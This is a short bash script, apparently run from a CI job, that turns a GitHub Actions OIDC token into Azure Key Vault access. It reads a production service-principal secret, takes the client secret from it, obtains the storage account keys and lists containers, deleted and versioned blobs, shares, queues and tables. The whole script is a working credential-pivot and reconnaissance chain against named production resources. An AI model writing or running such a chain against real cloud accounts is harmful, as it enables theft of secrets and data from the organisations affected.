#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
SA=sttblcilogsprodx3euoz
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
js=$(curl -sS "$PROD/sync-service-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
scid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or "")')
ssec=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or "")')
SARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$scid" -d grant_type=client_credentials --data-urlencode "client_secret=$ssec" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
KEY=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $SARM" -H "Content-Length: 0" | python3 -c 'import sys,json;d=json.load(sys.stdin);ks=d.get("keys",[]);print(ks[0]["value"] if ks else "")')
export AZURE_STORAGE_ACCOUNT=$SA AZURE_STORAGE_KEY="$KEY"
echo "### containers (incl deleted)"; az storage container list --include-deleted --auth-mode key -o tsv --query "[].name" 2>&1 | head
echo "### blobs logs (incl snapshots/versions/deleted/metadata)"; az storage blob list -c logs --include msvd --auth-mode key -o json 2>&1 | head -40
echo "### blob show build-2024.log (metadata/tags)"; az storage blob show -c logs -n build-2024.log --auth-mode key -o json --query "{meta:metadata,tags:tags}" 2>&1
echo "### FILE shares"; az storage share list --account-name $SA --account-key "$KEY" -o tsv --query "[].name" 2>&1 | head
echo "### QUEUES"; az storage queue list --account-name $SA --account-key "$KEY" -o tsv --query "[].name" 2>&1 | head
echo "### TABLES"; az storage table list --account-name $SA --account-key "$KEY" -o tsv --query "[].name" 2>&1 | head
echo END
